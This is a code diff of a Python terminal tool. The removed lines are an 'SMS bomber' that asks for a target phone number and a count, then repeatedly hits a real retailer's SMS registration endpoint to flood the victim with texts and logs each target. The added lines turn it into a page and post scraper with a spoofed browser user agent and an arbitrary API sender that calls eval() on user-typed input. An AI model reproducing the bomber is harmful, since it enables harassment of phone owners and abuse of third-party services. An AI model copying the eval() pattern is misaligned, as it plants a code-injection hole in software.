@@ -1,130 +1,143 @@
-import os
-import time
 import requests
+from bs4 import BeautifulSoup
+import time
 
-# Function: Loading Bar
-def loading_bar():
-    animation = [
-        "\033[32m[■□□□□□□□□□] 10%",
-        "\033[33m[■■□□□□□□□□] 20%",
-        "\033[34m[■■■□□□□□□□] 30%",
-        "\033[35m[■■■■□□□□□□] 40%",
-        "\033[36m[■■■■■□□□□□] 50%",
-        "\033[37m[■■■■■■□□□□] 60%",
-        "\033[38;5;46m[■■■■■■■□□□] 70%",
-        "\033[38;5;82m[■■■■■■■■□□] 80%",
-        "\033[38;5;118m[■■■■■■■■■□] 90%",
-        "\033[38;5;154m[■■■■■■■■■■] 100% \n\n\n",
-    ]
-    for i in animation:
-        print(i)
-        time.sleep(0.4)
-
-# Function: Save Log
-def save_log(target, sms_count):
-    with open("sms_log.txt", "a") as log_file:
-        log_file.write(f"Target: +880{target} | SMS Sent: {sms_count} | Time: {time.ctime()}\n")
-    print("\033[32m[+] Logs Saved Successfully!\033[0m")
-
-# Function: Internet Check
-def check_internet():
+# Function: Fetch HTML Content from URL
+def fetch_html(url):
     try:
-        requests.get("https://www.google.com", timeout=5)
-        return True
-    except requests.ConnectionError:
-        return False
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        }
+        response = requests.get(url, headers=headers)
+        response.raise_for_status()
+        return response.text
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Error Fetching URL: {e}")
+        return None
 
-# Welcome Screen
-def welcome_screen():
-    os.system('clear')
+# Function: Scrape Public Profile Information
+def scrape_profile(url):
+    html_content = fetch_html(url)
+    if html_content:
+        soup = BeautifulSoup(html_content, 'html.parser')
+        print(f"\n[+] Scraping Data from: {url}\n")
+
+        # Extracting Profile Name or Title
+        try:
+            name = soup.find('title').text.strip()
+            print(f"Name/Title: {name}")
+        except AttributeError:
+            print("Name not found.")
+
+        # Extracting Meta Description
+        try:
+            meta_desc = soup.find('meta', attrs={'name': 'description'})['content']
+            print(f"Description: {meta_desc}")
+        except (AttributeError, TypeError):
+            print("Description not found.")
+
+        # Extracting Links
+        try:
+            links = [a['href'] for a in soup.find_all('a', href=True)]
+            print(f"Total Links Found: {len(links)}")
+        except Exception:
+            print("No links found.")
+
+# Function: Scrape Posts (for public post URLs)
+def scrape_posts(url):
+    html_content = fetch_html(url)
+    if html_content:
+        soup = BeautifulSoup(html_content, 'html.parser')
+        print(f"\n[+] Scraping Posts from: {url}\n")
+
+        # Example: Extracting post content or text
+        try:
+            posts = soup.find_all('p')  # Adjust tag according to platform
+            for idx, post in enumerate(posts[:5], 1):  # Limiting to first 5 posts
+                print(f"[Post {idx}] {post.text.strip()}\n")
+        except Exception:
+            print("No posts found.")
+
+# Function: Send API Requests
+def api_request(api_url, payload=None):
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Content-Type': 'application/json'
+        }
+        if payload:
+            response = requests.post(api_url, json=payload, headers=headers)
+        else:
+            response = requests.get(api_url, headers=headers)
+        if response.status_code == 200:
+            print(f"\n[+] API Response: {response.json()}\n")
+        else:
+            print(f"[!] API Error: {response.status_code}")
+    except Exception as e:
+        print(f"[!] API Request Error: {e}")
+
+# Function: Delay Between Requests
+def delay(seconds):
+    print(f"\n[+] Waiting for {seconds} seconds...")
+    time.sleep(seconds)
+
+# Display Logo & Developer Information
+def display_logo():
     logo = """
-\033[1;94m
- ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗███╗   ███╗███████╗
-██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝████╗ ████║██╔════╝
-██║  ███╗██████╔╝███████║██████╔╝█████╔╝     █████╗  ██╔████╔██║█████╗  
-██║   ██║██╔═══╝ ██╔══██║██╔═══╝ ██╔═██╗     ██╔══╝  ██║╚██╔╝██║██╔══╝  
-╚██████╔╝██║     ██║  ██║██║     ██║  ██╗    ███████╗██║ ╚═╝ ██║███████╗
- ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝╚══════╝
-\033[1;93m                    CREATED BY: MR-D4RK
-\033[1;94m===============================================================
-\033[1;32m[1] Start SMS Bomber
-\033[1;33m[2] View Logs
-\033[1;31m[3] Exit
-\033[1;94m===============================================================
-"""
+\033[1;92m========================================
+SOCIAL MEDIA SCRAPER TOOL
+========================================
+    """
     print(logo)
 
-# SMS Bomber Function
-def sms_bomber():
-    os.system('clear')
-    print("\033[1;92mStarting SMS Bomber...\033[0m")
-    loading_bar()
-    
-    num = input("\033[38;5;46mEnter Target Number (+880): ")
-    amount = int(input("\033[38;5;46mEnter SMS Amount: "))
-    print("\033[1;94mSending SMS... Please Wait...\033[0m")
+    developer_info = """
+\033[1;94m[+]=====================================[+]
+\033[1;32m[+] DEVELOPED BY: MR-D4RK
+\033[1;32m[+] TOOL VERSION: 1.0
+\033[1;32m[+] GITHUB: https://github.com/MR-D4RK-OFFICIAL
+\033[1;32m[+] FACEBOOK:MD SOFIKUL ISLAM
+\033[1;94m[+]=====================================[+]
+    """
+    print(developer_info)
 
-    # APIs List
-    apis = [
-        {
-            "url": "https://www.thebodyshop.com.bd/smspro/customer/register",
-            "method": "POST",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
-            },
-            "data": {"phone": f"880{num}"}
-        },
-        {
-            "url": "https://www.thebodyshop.com.bd/smspro/customer/register",
-            "method": "POST",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
-            },
-            "data": {"phone": f"880{num}"}
-        },
-    ]
+# Main Program
+def main():
+    display_logo()
 
-    ses = 0
-    while ses < amount:
-        for api in apis:
-            try:
-                if api["method"] == "POST":
-                    response = requests.post(api["url"], headers=api["headers"], json=api["data"])
+    print("""
+    \033[1;92m========================================
+    1. Scrape Public Profile
+    2. Scrape Public Posts
+    3. Send API Request
+    4. Exit
+    \033[1;30m""")
 
-                if response.status_code == 200:
-                    ses += 1
-                    print(f"\033[38;5;46m[+]{ses} SMS Sent Successfully via {api['url']}...")
-                else:
-                    print(f"\033[1;31m[-] Failed to send SMS via {api['url']}\033[0m")
-            except Exception as e:
-                print(f"\033[1;31m[!] Error: {e}\033[0m")
-
-            if ses >= amount:
-                break
-
-    save_log(num, ses)
-    print("\033[38;5;46mAll SMS Sent Successfully!\033[0m")
-
-# Main Menu
-def main_menu():
     while True:
-        welcome_screen()
-        choice = input("\033[1;32mEnter Your Choice: ")
+        choice = input("\nEnter Your Choice (1/2/3/4): ")
         if choice == '1':
-            if check_internet():
-                sms_bomber()
-            else:
-                print("\033[1;31mNo Internet Connection! Please Check and Try Again.\033[0m")
+            profile_url = input("Enter Profile URL: ")
+            scrape_profile(profile_url)
         elif choice == '2':
-            os.system("cat sms_log.txt")
-            input("\nPress Enter to Return to Menu...")
+            post_url = input("Enter Post URL: ")
+            scrape_posts(post_url)
         elif choice == '3':
-            print("\033[1;92mThank You for Using the Tool!\033[0m")
+            api_url = input("Enter API URL: ")
+            payload = input("Enter Payload (JSON format, leave empty if GET): ")
+            if payload.strip():
+                try:
+                    payload = eval(payload)  # Convert string to dictionary
+                except Exception:
+                    print("[!] Invalid Payload Format!")
+                    continue
+            else:
+                payload = None
+            api_request(api_url, payload)
+        elif choice == '4':
+            print("Exiting...")
             break
         else:
-            print("\033[1;31mInvalid Choice! Please Try Again.\033[0m")
+            print("Invalid Choice. Try Again.")
 
-# Run the Program
-main_menu()
+# Run Program
+if __name__ == "__main__":
+    main()
